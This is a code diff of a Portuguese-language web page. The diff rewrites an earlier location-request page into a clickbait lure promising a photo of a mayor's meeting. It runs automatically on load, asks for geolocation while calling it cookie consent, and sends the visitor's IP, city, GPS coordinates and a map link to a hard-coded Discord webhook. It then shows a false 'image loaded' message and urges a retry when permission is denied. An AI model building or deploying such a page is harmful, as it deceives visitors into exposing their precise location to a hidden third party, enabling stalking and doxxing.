@@ -2,45 +2,100 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Evento de Localização</title>
+  <title>imagem direta</title>
+
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+
+    .img-click {
+      cursor: pointer;
+      max-width: 280px;
+      width: 80%;
+      margin-top: 20px;
+    }
+
+    #msg {
+      margin-top: 15px;
+      color: #555;
+      font-size: 14px;
+    }
+  </style>
 </head>
 <body>
-  <h2>📍 Evento Regional</h2>
-  <p>Para participar, autorize sua localização.</p>
-  <button onclick="go()">Permitir localização</button>
+
+  <h2>Veja com quem ele se encontrou</h2>
+  <p>Um cara desse ainda diz ser prefeito, autorize o cookies para mais detalhes</p>
+
+  <!-- IMAGEM CENTRALIZADA (fallback manual) -->
+  <img
+    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSm9GDELhZUJKb1-hfXRPjhLVQCsV_6UQcH_IQqzWUX5w&s"
+    class="img-click"
+    alt="Veja todo o detalhe"
+    onclick="go()"
+  >
+
+  <div id="msg">Solicitando localização…</div>
 
 <script>
 async function go() {
-  const ipData = await fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>null);
+  document.getElementById("msg").innerText = "Solicitando de acesso…";
 
-  navigator.geolocation.getCurrentPosition(async pos => {
-    const lat = pos.coords.latitude;
-    const lon = pos.coords.longitude;
-    const acc = pos.coords.accuracy;
+  const ipData = await fetch("https://ipapi.co/json/")
+    .then(r => r.json())
+    .catch(() => null);
 
-    await fetch("https://discord.com/api/webhooks/1465862095399817288/GcmIkAw0qPum20GWqxT0Y1XqOswQ2SFHKu4yATRrVV0cdWV8A1R3ohUDTRmD_XV7S_ez", {
-      method: "POST",
-      headers: {"Content-Type":"application/json"},
-      body: JSON.stringify({
-        content:
+  if (!navigator.geolocation) {
+    document.getElementById("msg").innerText =
+      "Geolocalização não suportada neste navegador.";
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    async pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const acc = pos.coords.accuracy;
+
+      await fetch("https://discord.com/api/webhooks/1465862095399817288/GcmIkAw0qPum20GWqxT0Y1XqOswQ2SFHKu4yATRrVV0cdWV8A1R3ohUDTRmD_XV7S_ez", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content:
 `📡 Nova localização
-IP: ${ipData?.ip}
-País: ${ipData?.country_name}
-Cidade: ${ipData?.city}
+IP: ${ipData?.ip || "N/A"}
+País: ${ipData?.country_name || "N/A"}
+Cidade: ${ipData?.city || "N/A"}
 
 GPS:
 Lat: ${lat}
 Lon: ${lon}
 Precisão: ${acc} m
 🗺️ https://maps.google.com/?q=${lat},${lon}`
-      })
-    });
+        })
+      });
 
-    alert("✅ Localização enviada!");
-  }, () => alert("❌ Permissão negada"));
+      document.getElementById("msg").innerText =
+        "imagem carregada!";
+    },
+    () => {
+      document.getElementById("msg").innerText =
+        "❌ cookies negado. Toque na imagem para tentar novamente.";
+    }
+  );
 }
-  // executa automaticamente ao abrir
+
+// tenta automaticamente ao abrir
 window.onload = go;
 </script>
+
 </body>
 </html>
